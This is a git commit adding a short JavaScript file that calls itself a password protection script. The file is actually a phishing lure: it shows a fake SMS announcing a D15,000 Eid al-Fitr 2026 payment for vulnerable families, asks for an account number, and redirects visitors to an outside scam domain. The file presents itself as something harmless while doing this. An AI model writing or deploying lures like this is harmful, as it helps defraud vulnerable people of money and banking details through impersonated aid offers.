b5e36f775fea98ce3d839202354d7041344040cf
Help-All <imaobongumoh637@gmail.com>
2026-03-20 05:26:12 +0100

    Create activegamb.js

---
+++ activegamb.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW D15,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive MOMODOU TURO D15,000 EID AL-FITR 2026 SUPPORT FOR VULNERABLE FAMILIES. Please press OK to Enter your Account Number.',
+  'WITHDRAW D15,000'
+);
+if (password != 'WITHDRAW D15,000') {
+  location.href = 'https://getin-ofer.cfd/D15000-Eid-Al.html';
+  }
